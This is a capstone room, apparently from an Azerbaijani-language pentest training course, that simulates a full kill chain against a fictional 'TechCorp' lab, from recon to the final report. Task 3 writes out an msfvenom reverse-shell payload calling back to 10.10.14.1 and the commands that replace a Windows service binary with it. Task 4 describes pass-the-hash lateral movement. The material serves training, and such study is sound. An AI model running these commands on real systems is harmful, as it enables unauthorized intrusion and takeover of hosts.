# Room: Tam Ssenari — Uçdan-uca Simulyasiya

**Path:** Reporting & Capstone
**Module:** Capstone
**Çətinlik:** Intermediate
**Təxmini vaxt:** 4 saat

## Room haqqında

Bu — bütün curriculum-un final room-udur: recon-dan hesabata qədər hər mərhələni birləşdirən vahid ssenari. Əvvəlki room-lar hər biri öz "daşını" öyrətdi; burada daşlar bir binaya yığılır. Room tətbiq-yönümlüdür: tam hücum hekayəsi (kill chain) üzrə addım-addım simulyasiya + hər addımda "hansı room-dan hansı bilik" izahı + yekun hesabat tapşırığı.

## Öyrənmə nəticələri

- Bütün pentest mərhələlərini (recon → reporting) vahid ssenaridə birləşdirmək
- Hər mərhələnin nəticəsinin növbəti mərhələyə "xammal" olduğunu görmək
- Kill chain modeli üzrə hücumu izləmək və izah etmək
- Tam hesabat (executive + technical) yazmağı tətbiq etmək

## Task 1 — Ssenari və Planlaşdırma: Hədəf və Çərçivə

**Ssenari (lab əsaslı — məs. HackTheBox/TryHackMe-nin "hard" maşını və ya öz qurduğunuz mühit):**

> Müştəri "TechCorp" (sənaye təchizatı şirkəti) black-box external pentest sifariş edib.
> Scope: `techcorp.az` və `10.10.10.0/24` (razılaşdırılmış DMZ seqmenti).
> Məqsəd: daxili şəbəkəyə keçid və həssas məlumatın çıxarılma imkanının sübutu.
> ROE: hafta içi 09:00-18:00, DoS qadağan, social engineering bu mərhələdə scope xarici.

İlk addım — **planlaşdırma** (heç bir room-da ayrıca öyrədilməyən, amma hər room-un şərti olan hissə):

1. Scope-un texniki xəritəyə çevrilməsi: domain adı, IP aralığı, vaxt pəncərəsi.
2. Metodologiya seçimi: OSMM/PTES/WSTG üzrə axın.
3. Alət dəstinin hazırlanlığı: Kali, Burp, Metasploit, hashcat, BloodHound, report şablonu.
4. Kommunikasiya: müştəri əlaqə nöqtəsi, "hərəkət edirikmi?" təsdiq kanalı, crash/disconnect hallarında prosedur.
5. Jurnal başlanlığı: hər addım, vaxt, nəticə — hesabatın xammalı.

Bu ssenaridə izləyəcəyimiz kill chain (bütün curriculum-un mərhələləri bir sətirdə):

```
Recon → Enum → İlk giriş (exploit) → Foothold → Privesc
   → Daxili şəbəkə (AD/pivot) → Hədəf data → Exfil sübutu → Hesabat
```

Hər halqa növbəti task-larda — konkret hərəkətlər, alətlər, qərarlar və "hansı room" istinadları ilə. Sizin tapşırığınız ssenarini paralel öz lab-ınızda yaşamaq — hər task-ın sonunda "öz mühitinizdə təkrarlayın" praktiki göstərişi olacaq.

**Sual 1**
Planlaşdırma mərhələsinin beş elementini sadalayın.

**Sual 2.**
Kill chain sətrindəki hər halqa hansı path/module-a uyğun gəlir?

**Sual 3.**
Jurnal nə üçün əvvəldən başlanmalıdır?

## Task 2 — Recon və Enumeration: Xəritə Qurma

**Mərhələ 1 — Passiv recon (Path 2.3, OSINT):**

- WHOIS/crt.sh: `techcorp.az` subdomain-ləri → `vpn.techcorp.az`, `dev.techcorp.az` tapılır.
- `dev.techcorp.az` — passiv siqnallarda köhnə test saytı k görünür (wayback machine-də səhifələr).
- Google dorking: `site:techcorp.az filetype:pdf` → PDF metadata-da daxili istifadəçi adları (`a.mammadov`, `s.hasanli`).

**Mərhələ 2 — Aktiv recon (Nmap):**

```bash
nmap -sV -sC -p- --min-rate 2000 10.10.10.0/24
# Nəticə xəritəsi (ısim:
# 10.10.10.5: 22, 80 (nginx), 443
# 10.10.10.10: 80 (Apache — dev saytı), 8080
# 10.10.10.20: 445, 3389 (Windows)
# 10.10.10.50: 88, 389, 445 (Domain Controller!)
```

**Mərhələ 3 — Servis enumeration (Path 2.3):**

- HTTP (10.10.10.10 — dev saytı): whatweb → WordPress 5.6; wpscan → plugin "custom-gallery 1.2" (public RCE); robots.txt → `/backup`, orada `db_dump.bak`.
- SMB (10.10.10.20): `smbclient -L -N` → `backup` paylaşımı parolsuz → içində `old_creds.txt` → `s.hasanli:Summer2023!`.
- DNS/LDAP (10.10.10.50): domain `techcorp.local` təsdiqi, DC identifikasiya.

**Qərar nöqtəsi** (pentest-in məntiqi burada işə düşür): üç mümkün yol — (a) WordPress RCE (ən texniki), (b) tapılmış credential-la VPN/SSH deneməsi, (c) dev saytın digər zəiflikləri. Seçim: əvvəlcə **(b) credential sınağı** — ən az iz, ən sürətli. `ssh s.hasanli@10.10.10.5` — uğursuz (yanlış parol). Amma `10.10.10.20`-də (Windows) WinRM açıqdır:

```bash
evil-winrm -u s.hasanli -p 'Summer2023!' -i 10.10.10.20
# → Shell! İlk foothold.
```

**Praktik (öz lab-ınızda):** TryHackMe/HTB maşınında eyni ardıcıllığı keçin — passiv ( crt.sh, wayback) → aktiv (port xəritəsi) → servis enum (hər port üçün alət) → qərar nöqtəsi (yolları siyahılayıb seçin). Jurnala hər tapıntını yazın.

**Sual 1**
Passiv recon bu ssenaridə nə verdi?

**Sual 2.**
Credential yolunun exploit-dən üstün seçilməsinin məntiqi nədir?

**Sual 3.**
"Sətirin axınında hər tapıntı növbəti mərhələnin xammalıdır" — nümunələ göstərin.

## Task 3 — Foothold-dan Privesc-a: Sistem Daxilində Yüksəliş

**Mövcud mövqe:** `s.hasanli` adi istifadəçi, Windows host (10.10.10.20), WinRM shell.

**Addım 1 — Yerləşmə (post-exploitation giriş):**

```cmd
whoami /all        # qruplar: Domain Users; imtiyazlar: adi
ipconfig           # daxili interfeys: 10.10.10.20 (DMZ), ikinci: 10.10.11.20 (daxili!)
```

**Kəşf:** host iki şəbəkədə — DMZ və daxili. Daxili seqment (10.10.11.0/24) bizim birbaşa çıxışımız yoxdur — pivot potensialı (Path 7.2 bilikləri).

**Addım 2 — Enum (winPEAS + PowerView):** winPEAS: `C:\Program Files\Legacy\update.exe` servis — qeyri-standart, LocalSystem, binary qovluğu yazıla bilən (Path 6.2-nin klassik qapısı!).

**Addım 3 — Privesc (servis binary əvəzi):**

```bash
# attacker: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4455 -f exe -o up.exe
# köçür (evil-winrm upload)
```

```cmd
move "C:\Program Files\Legacy\update.exe" "C:\Program Files\Legacy\update.old"
move C:\Users\s.hasanli\up.exe "C:\Program Files\Legacy\update.exe"
sc stop LegacyUpdate && sc start LegacyUpdate
# → SYSTEM shell (4455 portunda)
```

**Addım 4 — SYSTEM-dən toplanan material (AD hücumunun xammalı — Path 5):**

- `hashdump`-analoji: lokal SAM + LSASS-dan domain credential izləri: `a.mammadov` hash-i (domain user, WALLET-də görünüb).
- Daxili şəbəkə xəritəsi: `10.10.11.10` (file server), `10.10.11.50` (ikinci DC? yox — 10.10.10.50 DC).

**Praktik:** öz maşınınızda privesc keçəndə **hər addımı jurnala yazın** — screenshot + əmr + vaxt. Bu, hesabatın sübut bazasıdır.

**Sual 1**
İki interfeysin kəşfi hansı imkanı açdı?

**Sual 2.**
Servis privesc-inin hansı şərtləri bu ssenaridə birləşdi?

**Sual 3.**
SYSTEM-dən toplanan hansı materiallar AD mərhələsinin xammalıdır?

## Task 4 — AD Mərhələsi və Hədəf Data: Zəncirin Tamamlanması

**Addım 1 — AD enum (BloodHound — Path 5.1):** SharpHound toplanması (SYSTEM shell-dən) → BloodHound analizi:

- `s.hasanli` → `IT-Support` qrupu → `FILE-SRV` (10.10.11.10) lokal admin.
- `a.mammadov` (hash-i əldə edilmiş) → `Backup Admins` → `FILE-SRV`-də backup servisi idarə edir.
- Kerberoastable: `sql-svc` hesabı.

**Addım 2 — Hərəkət (lateral movement — Path 5.2):**

- Pass-the-Hash (a.mammadov hash) → `FILE-SRV`-ə WMI icra → admin shell.
- `FILE-SRV`-də backup qovluğunda: `techcorp.local.ntds.dit`-in köhnə surəti + `krbtgt`-nin köhnə hash-i (2023 backup — Golden Ticket materialı, amma **scope müzakirəsi lazım**: domain tam kompromiti ROE-də "hədəf data sübutu" kimi kifayətdir — DC-ə hücum dayandırılır).

**Addım 3 — Hədəf data sübutu (exfiltration sınağı — Path 7.1):**

Müştəri datasının çıxarılması qadağadır; **sintetik sübut**: backup qovluğunda `README.md` (bizim əvvəlcədən qoyduğumuz marker fayl) razılaşdırılmış hədəfə (müştərinin verdiyi test endpoint) HTTPS POST ilə göndərilir. Sübut: transfer log + müştərinin təsdiqi ("fayl gəlib çatdı"). Exfiltration **imkanının** sübutu — məlumatın özünün yox.

**Addım 4 — Dayanma qərarı:** kill chain tamamlandı: giriş → privesc → daxili → hədəf → exfil sübutu. Davamı (persistence qoymaq, DC-yə hücum) — ROE məqsədlərinə daxil deyil. **Peşəkar dayanma — bacarıqdır.**

**Addım 5 — Təmizləmə:** qoyulan fayllar (`up.exe`, `update.old`, SharpHound output), yaradılan sessiyalar — mümkün olan hamısı geri qaytarılır/d silinir, jurnala "təmizləmə log-u" yazılır. Müştəriyə hesabatda **qalan izlərin tam siyahısı** verilir (hansı log-larda nə görünür — onların IR/monitorinqi üçün).

**Praktik:** öz lab-ınızda eyni məntiqlə dayanın: "məqsəd sübutu alındımı?" sualı → hə → təmizlə → hesabata keç.

**Sual 1**
BloodHound bu ssenaridə hansı yolu göstərdi?

**Sual 2.**
"Golden Ticket materialı tapıldı, amma dayanıldı" — hansı prinsip?

**Sual 3.**
Exfiltration sübutu sintetik-marker üsulu ilə nə göstərir?

## Task 5 — Hesabat və Debriefing: İşin Bağlanması

**Hesabat (Path 8.1 strukturunda):**

**Executive Summary (1 səhifə):**

> "TechCorp-un DMZ seqmentindən daxili şəbəkəyə tam keçid mümkündür. Zəif parolların idarə edilməməsi, köhnəlmiş test sistemi və servis konfiqurasiyası səhvləri birləşərək, hücumçunun korporativ fayl serverinə və backup arxivinə çatmasına imkan verdi. Backup arxivində domain-in tam nəzarət materialları saxlanılır — bu, bütün korporativ şəbəkənin kompromiti riski deməkdir. Ən kritik üç tədbir: (1) backup infrastrukturunun izolyasiyası, (2) parol/credential idarəetməsi, (3) köhnə test sistemlərinin qaldırılması."

**Technical Findings (hər biri tam strukturla — nümunə sırası ilə):**

| # | Tapıntı | Severity (CVSS) |
|---|---|---|
| 1 | Parolsuz SMB backup paylaşımı + credential sızıntısı | Critical (8.8+) |
| 2 | Köhnə WordPress (dev) — public RCE | Critical |
| 3 | Servis binary yazma (privesc) | High (7.8 — AV:L) |
| 4 | Pass-the-Hash mümkünlüyü (NTLM aktiv, LAPS yox) | High |
| 5 | NTDS backup-ın zəif qorunması | Critical |
| 6 | İkişəbəkəli host (pivot nöqtəsi) | Medium (arxitektura) |
| 7 | Kerberoastable hesablar (zəif parol riski) | Medium |
| 8 | Vaxt aşkarlanan debug/error sızıntıları | Low/Info |

Hər tapıntıda: yer, təsvir, təsir, sübut (jurnaldan screenshot-lar), remediation (kod/konfiq nümunəsi), referanslar. Zəncir tapıntısı ayrıca: "Cred → PTH → backup → domain materialı" hekayəsi.

**Attack narrative (capstone hesabatına xas bölmə):** bütün kill chain vahid hekayə kimi — rəhbərlik üçün "necə getdik", IR üçün "harada görə bilərdiniz" (hər mərhələnin detection nöqtələri: SMB anonim login siqnalı, yeni servis binary, PTH anomaliyaları...).

**Retest planı:** tapıntı → düzəliş → 30 günə retest razılaşdırılır.

**Debriefing mövzusu — bütün curriculum-un yekun dərsləri:**

1. **Hər mərhələ ayrıca "kiçik" idi** — bütün room-ların bilikləri; güc onların zəncirlənməsindədir.
2. **Enum qərar verir:** hər addımda yollar siyahılanır və seçilir — alət deyil, mühakimə.
3. **Dayanma və təmizləmə** peşəkarlığın ölçüsüdür: hücum bitmir — **sübut alınanda və ROE qurtaranda** bitir.
4. **Hesabat — işin özüdür:** texniki fəaliyyət onun üçün idi.

**Təbrik:** bu room-la Path-8 və bütün curriculum (Path 2-8) tamamlanır. Növbəti addımlar: real platformalarda (HTB Pro Labs, TryHackMe paths, bug bounty) təcrübə toplağı; xüsusi istiqamət seçimi (web/AD/red team/müdafiə); və müntəzəm təkrar — bu room-lara dönüb "yenidən keçmək" bilikləri sabitləşdirir.

**Sual 1**
Capstone hesabatına xas "Attack narrative" bölməsi kimə və nəyə lazımdır?

**Sual 2.**
"Dayanma peşəkarlığın ölçüsüdür" — ssenaridən izah edin.

**Sual 3.**
Curriculum-un yekun dörd dərsini sadalayın.
